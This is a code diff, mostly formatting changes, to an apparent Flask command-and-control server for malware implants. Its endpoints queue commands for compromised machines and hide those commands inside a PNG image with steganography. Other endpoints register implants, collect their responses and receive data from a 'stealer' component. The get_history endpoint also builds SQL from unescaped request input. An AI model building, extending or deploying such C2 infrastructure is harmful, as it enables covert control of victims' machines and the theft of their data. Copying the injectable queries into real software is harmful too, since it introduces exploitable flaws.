@@ -20,7 +20,7 @@ import RsaDecryption
 app = Flask(__name__)
 CORS(app)
 
-# Environment variables 
+# Environment variables
 config.host = config('host')
 config.password = config('password')
 config.username = config('username')
@@ -34,6 +34,8 @@ app.config['CORS_HEADERS'] = 'Content-Type'
 jwt = JWTManager(app)
 
 # Logs user out of system
+
+
 @app.route('/logout', methods=["POST"])
 def logout():
     try:
@@ -43,7 +45,9 @@ def logout():
     except:
         return "couldn't logout...", 500, {'Access-Control-Allow-Origin': config.clientURL}
 
-#Logs user into system 
+# Logs user into system
+
+
 @app.route('/login', methods=["POST"])
 def create_token():
     access_token = ""
@@ -63,16 +67,20 @@ def create_token():
         print(f"error logging in: {error}")
         return {'failure': 'failure'}, 500, {'Access-Control-Allow-Origin': config.clientURL}
 
+
 @app.route("/test", methods=["GET"])
 def handle_test():
     stuff = tools.executeInsertQuery("SELECT * from command_queue")
     return jsonify(stuff)
+
 
 @app.route("/")
 def home():
     return "<div>Hi</div>", 200
 
 # api endpoint to queue a command
+
+
 @app.route("/queueCommand", methods=["POST"])
 @jwt_required()
 def handle_execute():
@@ -101,6 +109,8 @@ def handle_execute():
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 # List all commands for a particular implant
+
+
 @app.route("/get_qcommands", methods=["POST"])
 def get_qcommands():
     data = request.json
@@ -113,14 +123,15 @@ def get_qcommands():
             column=sql.Identifier('target_implant_id'))
         db_resp = tools.executeSelectQueryVars(query, [id])
         print(f"this is the db response: {db_resp}")
-    
+
         if db_resp == None:
             db_resp = {"commands": "No commands found"}
         data = json.dumps(db_resp)
         query = "UPDATE task_queue SET status=%s WHERE task_id=%s"
         tools.executeGenericVar(query, ['executing', id])
 
-        didNotWork = SteganographyFixed.createEncodedImage("doge.png", data, "doge_encoded.png")
+        didNotWork = SteganographyFixed.createEncodedImage(
+            "doge.png", data, "doge_encoded.png")
 
         if (didNotWork != None):
             print()
@@ -129,7 +140,7 @@ def get_qcommands():
             print()
             print()
             return didNotWork
-        
+
         return send_file('doge_encoded.png', as_attachment=True), {'Access-Control-Allow-Origin': config.clientURL}
 
     except Exception as error:
@@ -137,7 +148,9 @@ def get_qcommands():
         print(error)
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
-# List all commands for a particular implant, in json 
+# List all commands for a particular implant, in json
+
+
 @app.route("/get_commands", methods=["POST"])
 def get_commands():
     data = request.json
@@ -151,7 +164,7 @@ def get_commands():
 
         if db_resp == None:
             db_resp = {"commands": "No commands found"}
-        
+
         response = db_resp
         return response, {'Access-Control-Allow-Origin': config.clientURL}
 
@@ -161,7 +174,7 @@ def get_commands():
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 
-#Client endpoint for listing commands
+# Client endpoint for listing commands
 @app.route("/client_get_commands", methods=["POST"])
 def client_get_commands():
     data = request.json
@@ -176,6 +189,8 @@ def client_get_commands():
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 # List untouched commands for a particular implant don't yell at me this was just the easiest to do instead of refactor client
+
+
 @app.route("/get_untouched", methods=["POST"])
 def get_untouched():
     data = request.json
@@ -190,6 +205,8 @@ def get_untouched():
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 # List executing commands for a particular implant don't yell at me this was just the easiest to do instead of refactor client
+
+
 @app.route("/get_executing", methods=["POST"])
 def get_executing():
     data = request.json
@@ -204,6 +221,8 @@ def get_executing():
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 # List executed commands for a particular implant don't yell at me this was just the easiest to do instead of refactor client
+
+
 @app.route("/get_executed", methods=["POST"])
 def get_executed():
     data = request.json
@@ -218,6 +237,8 @@ def get_executed():
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 # Register an implant, on the implant side TODO
+
+
 @app.route("/register_implant", methods=["POST"])
 def register_implant():
     try:
@@ -242,6 +263,8 @@ def register_implant():
         return e, {'Access-Control-Allow-Origin': config.clientURL}
 
 # Display implants
+
+
 @app.route("/display_implants", methods=["GET"])
 def display_implants():
     try:
@@ -257,8 +280,10 @@ def display_implants():
 def handle_response_stealer():
     print("Recieved stealer")
     try:
-        data = request.get_json(force=True)
-        print(data)
+        request.get_data()
+        data = request.data
+        dict = json.loads(data)
+        print(dict.keys())
         #  if "stealer" in command:
         #     # TODO call Wyatt's function
         #     response_data = WyattWonderland.parsejson(response_data)
@@ -307,6 +332,12 @@ def getsymkey():
 
 
 #Implant response endpoint, in json
+# Implant response endpoint, in json
+
+# Addisons Worktime -
+# Attempting to add encryption
+
+
 @app.route("/response_data", methods=["POST"])
 @cross_origin()
 def handle_response_data():
@@ -333,16 +364,17 @@ def handle_response_data():
             # DUMP BACK INTO TASK_QUEUE
 
             if success in ["success", "Success"]:
-                success = True  
-            else: 
+                success = True
+            else:
                 success = False
 
             query = "UPDATE task_queue SET status = 'executed', response_data = %s, success = %s, recieved_on = %s WHERE task_id= %s"
-            if query ==[]:
+            if query == []:
                 print("\n\nupdate task queue worked\n\n")
             time = datetime.now()
             print(response_data, success, time, task_id)
-            response = tools.executeGenericVar(query, [response_data, success, time, task_id])
+            response = tools.executeGenericVar(
+                query, [response_data, success, time, task_id])
             print(response)
             return "success", 200, {'Access-Control-Allow-Origin': config.clientURL}
 
@@ -353,7 +385,7 @@ def handle_response_data():
         return "failure", 409, {'Access-Control-Allow-Origin': config.clientURL}
 
 
-#Implant response endpoint, in json
+# Implant response endpoint, in json
 @app.route("/response_json", methods=["POST"])
 @cross_origin()
 def handle_response_json():
@@ -372,17 +404,18 @@ def handle_response_json():
         # DUMP BACK INTO TASK_QUEUE
 
         if success in ["success", "Success"]:
-            success = True  
-        else: 
+            success = True
+        else:
             success = False
 
         query = "UPDATE task_queue SET status = 'executed', response_data = %s, success = %s, recieved_on = %s WHERE task_id= %s"
-        if query ==[]:
-            print("\n\nupdate task queue worked\n\n")
         time = datetime.now()
         print(response_data, success, time, task_id)
-        response = tools.executeGenericVar(query, [response_data, success, time, task_id])
+        response = tools.executeGenericVar(
+            query, [response_data, success, time, task_id])
         print(response)
+        if response == []:
+            print("\n\nupdate task queue worked\n\n")
         return "success", 200, {'Access-Control-Allow-Origin': config.clientURL}
 
     except Exception as error:
@@ -391,6 +424,7 @@ def handle_response_json():
         print(error)
         print()
         return "failure", 409, {'Access-Control-Allow-Origin': config.clientURL}
+
 
 @app.route("/response", methods=["POST"])
 @cross_origin()
@@ -447,36 +481,38 @@ def testThis():
         print(error)
         return error, 401, {'Access-Control-Allow-Origin': '*'}
 
-# Gets log history of a particular implant
-
-
+# Gets log history of a particular implant, for console
 @app.route("/get_history", methods=["POST"])
 def get_history():
     try:
-
         data = request.json
         id = data['id']
 
         pending = tools.executeSelectQuery(
             f"SELECT * FROM task_queue WHERE (target_implant_id={id} AND status=\'untouched\')")
-
         executed = tools.executeSelectQuery(
             f"SELECT * FROM task_queue WHERE (target_implant_id={id} AND status=\'executed\')")
-
         executing = tools.executeSelectQuery(
             f"SELECT * FROM task_queue WHERE (target_implant_id={id} AND status=\'executing\')")
-        print(f"this is executing responses: {executing}")
-        # "success": x[-3]
-        # [(2, 1, 'implant', datetime.datetime(2022, 12, 1, 16, 58, 44, 674016), 'untouched', responseData, success, recieved, creator)
-        pending = [{"sender": "user", "creator": x[-1],
-                    "time":x[3], "command":x[2]} for x in pending]
         combined = [{"sender": "user", "creator": x[-1],
                      "time":x[3], "command":x[2]} for x in executing]
+       
+        combined += [{"sender": "implant", "time": x[-2],
+                      "command":x[2], "response":x[-4]} for x in executing]
+       
+        combined += [{"sender": "user", "creator": x[-1],
+                     "time":x[3], "command":x[2]} for x in executed]
+        print(combined)
         combined += [{"sender": "implant", "time": x[-2],
                       "command":x[2], "response":x[-4]} for x in executed]
-        combined += pending
 
+       
+        combined += [{"sender": "user", "creator": x[-1],
+                      "time":x[3], "command":x[2]} for x in pending]
+
+        
         sortedList = sorted(combined, key=lambda x: x['time'])
+       
 
         return {"sorted": sortedList}, 200, {'Access-Control-Allow-Origin': '*'}
     except Exception as e:
@@ -484,22 +520,3 @@ def get_history():
         return e, {'Access-Control-Allow-Origin': '*'}
 
     # Construct a linear history of commands -> responses
-
-# for testing
-# def main():
-#     target_implant_id = 1
-#     command = 'some long command'
-#     created_on = '2022-12-01T16:41:10.592868'
-#     status = 'untouched'
-#     data = [target_implant_id, command, created_on, status]
-#     columns = ['target_implant_id', 'command', 'created_on', 'status']
-
-#     query = insertQueryBuilder('task_queue', columns)
-#     results = executeInsertQuery(query, data)
-
-#     print(results)
-
-
-# if __name__ == "__main__":
-#     main()
-
